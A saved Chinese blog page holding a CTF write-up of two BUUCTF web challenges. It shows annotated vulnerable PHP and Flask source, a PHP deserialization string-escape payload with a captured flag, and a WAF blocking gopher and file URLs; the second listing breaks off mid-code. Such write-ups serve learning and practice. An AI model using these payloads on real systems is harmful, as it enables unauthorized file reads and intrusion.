<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>exercise | Lionel</title><meta name="author" content="Lionel Kai"><meta name="copyright" content="Lionel Kai"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ALL KINDS OF 1.BUUCTF—-WP1.[安洵杯 2019]easy_serialize_php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;?php$fun">
<meta property="og:type" content="article">
<meta property="og:title" content="exercise">
<meta property="og:url" content="https://github.com/Lionelkkk/Lionelkkk.github.io/2022/02/13/exercise/index.html">
<meta property="og:site_name" content="Lionel">
<meta property="og:description" content="ALL KINDS OF 1.BUUCTF—-WP1.[安洵杯 2019]easy_serialize_php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;?php$fun">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://github.com/Lionelkkk/Lionelkkk.github.io/img/head.png">
<meta property="article:published_time" content="2022-02-13T12:55:31.000Z">
<meta property="article:modified_time" content="2023-01-31T12:48:45.343Z">
<meta property="article:author" content="Lionel Kai">
<meta property="article:tag" content="wp orz">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://github.com/Lionelkkk/Lionelkkk.github.io/img/head.png"><link rel="shortcut icon" href="/img/wow.png"><link rel="canonical" href="https://github.com/Lionelkkk/Lionelkkk.github.io/2022/02/13/exercise/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'exercise',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-01-31 20:48:45'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = url => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      link.onload = () => resolve()
      link.onerror = () => reject()
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Lionel"><span class="site-name">Lionel</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">exercise</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-13T12:55:31.000Z" title="发表于 2022-02-13 20:55:31">2022-02-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-31T12:48:45.343Z" title="更新于 2023-01-31 20:48:45">2023-01-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/not-a-big-deal/">not a big deal</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="exercise"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><p>ALL KINDS OF</p>
<h1 id="1-BUUCTF—-WP"><a href="#1-BUUCTF—-WP" class="headerlink" title="1.BUUCTF—-WP"></a>1.BUUCTF—-WP</h1><h2 id="1-安洵杯-2019-easy-serialize-php"><a href="#1-安洵杯-2019-easy-serialize-php" class="headerlink" title="1.[安洵杯 2019]easy_serialize_php"></a>1.[安洵杯 2019]easy_serialize_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];<span class="comment">#获取一个参数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;<span class="comment">#将数组中出现过的替换为空</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line">extract(<span class="variable">$_POST</span>);<span class="comment">#这里有一个变量覆盖，前面SESSION中的所有的键值都会清空，从而只看post提交的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#这里先进行传参后序列化，再过滤，看filter函数，正则替换为空，导致这里序列化缩短漏洞</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#原理:因为序列化的字符串是严格的，对应的格式不能错，比如s:4:&quot;name&quot;,那s:4就必须有一个字符串长度是4的否则就往后要。</span></span><br><span class="line"><span class="comment">#并且unserialize会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号后面的就都被扔掉。</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#利用unserialize会把  &#125;  后面多余 的当垃圾处理 这里采用字符串逃逸的方式</span></span><br><span class="line"><span class="variable">$_SESSION</span>[phpflag]=<span class="string">&#x27;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mbGxsbGxsYWc=&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="comment">#首先  POST  传参</span></span><br><span class="line">_SESSION[phpflag]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mbGxsbGxsYWc=&quot;</span>;&#125;</span><br><span class="line"><span class="comment">#并且  get   传参</span></span><br><span class="line">?f=show_image</span><br><span class="line"><span class="comment">#解释post,在serialize($_SESSION)=</span></span><br><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;phpflag&quot;</span>;s:<span class="number">48</span>:<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br><span class="line"><span class="comment">#当phpflag被filter替换为空后，</span></span><br><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;    &quot;</span>;s:<span class="number">48</span>:   <span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;    &quot;</span>;&#125;</span><br><span class="line"><span class="comment">#   &quot;;s:48:  被当成一个键，值是  s:1:&quot;1&quot;;   ZDBnM19mMWFnLnBocA==  d0g3_f1ag.php的base64</span></span><br><span class="line"><span class="comment">#那么新的键值-----&gt;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;就出来了，从而可以包含文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#访问页面发现   $flag = &#x27;flag in /d0g3_fllllllag&#x27;;</span></span><br><span class="line"><span class="comment">#于是继续包含   /d0g3_fllllllag  文件，base64后发现还是20个字符，所以不需要改字符多少，直接带入可以包含文件，拿到flag</span></span><br><span class="line"><span class="comment">#flag&#123;60d2d349-36a6-43c0-97f1-90165f3ee274&#125;</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------</span></span><br><span class="line"><span class="variable">$serialize_info</span> = filter(serialize(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="comment">#这里可以知道，我门需要设置	f=show_image  才能本地包含到文件</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">    <span class="comment">#这里的提示我们去查看phpinfo </span></span><br><span class="line">    <span class="comment">#auto_append_file	d0g3_f1ag.php	d0g3_f1ag.php</span></span><br><span class="line">    <span class="comment">#于是猜测flag应该在这个文件里面，需要包含这个文件</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = unserialize(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-De1CTF-2019-SSRF-Me"><a href="#2-De1CTF-2019-SSRF-Me" class="headerlink" title="2.[De1CTF 2019]SSRF Me"></a>2.[De1CTF 2019]SSRF Me</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span>  <span class="comment"># python的构造方法</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">not</span> os.path.exists(self.sandbox)):  <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span>  <span class="comment"># 定义的命令执行函数，此处调用了scan这个自定义的函数</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="comment"># md5(secert_key + self.action + self.param).hexdigest() == self.sign</span></span><br><span class="line">            <span class="comment"># md5(secert_key + self.action + self.param).hexdigest() == hashlib.md5(secert_key + param + &quot;scan&quot;).hexdigest()</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:  <span class="comment"># action要写scan</span></span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)  <span class="comment"># 此处是文件读取得注入点</span></span><br><span class="line">                <span class="comment"># resp = urllib.urlopen(param).read()</span></span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp  <span class="comment"># 输出结果，但是这里不会真的回显，只是回显到计算机上的dos里面</span></span><br><span class="line">                    tmpfile.write(resp)<span class="comment">#将flag.txt的内容写进result.txt</span></span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:  <span class="comment"># action要加read</span></span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):  <span class="comment"># !!!校验</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="comment"># md5(secert_key + param + action).hexdigest()</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span><span class="comment"># !!!这个路由用于测试</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="comment"># hashlib.md5(secert_key + param + action).hexdigest()</span></span><br><span class="line"><span class="comment"># hashlib.md5(secert_key + param + &quot;scan&quot;).hexdigest()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)  </span><span class="comment"># 这个路由是我萌得最终注入点</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> (waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)  </span><span class="comment"># 根目录路由，就是显示源代码得地方</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span>  <span class="comment"># 这是用来扫目录得函数</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span>  <span class="comment"># !!!这个应该是本题关键点,此处注意顺序先是param后是action</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span>  <span class="comment"># 这个waf比较没用好像</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span 